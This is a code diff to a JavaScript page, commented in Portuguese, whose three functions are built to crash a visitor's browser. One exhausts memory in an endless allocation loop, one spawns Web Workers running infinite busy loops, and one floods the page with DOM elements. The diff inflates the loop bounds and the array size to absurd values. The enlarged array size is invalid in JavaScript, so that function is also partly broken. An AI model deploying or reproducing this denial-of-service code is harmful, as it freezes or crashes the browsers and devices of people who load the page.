@@ -8,7 +8,7 @@
         // 1. Loop infinito de alocação de memória
         function memoryCrash() {
             while (true) {
-                const arr = new Array(1000000).fill(new Float32Array(1000));
+                const arr = new Array(10000000000000000000000000).fill(new Float32Array(1000));
             }
         }
 
@@ -16,7 +16,7 @@
         function cpuCrash() {
             const blob = new Blob(['while(true){for(let i=0;i<1000000;i++){Math.sin(i);}}'], { type: 'text/javascript' });
             const url = URL.createObjectURL(blob);
-            for (let i = 0; i < 1000; i++) {
+            for (let i = 0; i < 10000000000000000000000000000000; i++) {
                 new Worker(url);
             }
         }
@@ -24,7 +24,7 @@
         // 3. Sobrecarga DOM
         function domCrash() {
             while (true) {
-                for (let i = 0; i < 1000; i++) {
+                for (let i = 0; i < 100000000000000000000000000000; i++) {
                     const div = document.createElement('div');
                     div.style.width = '100px';
                     div.style.height = '100px';
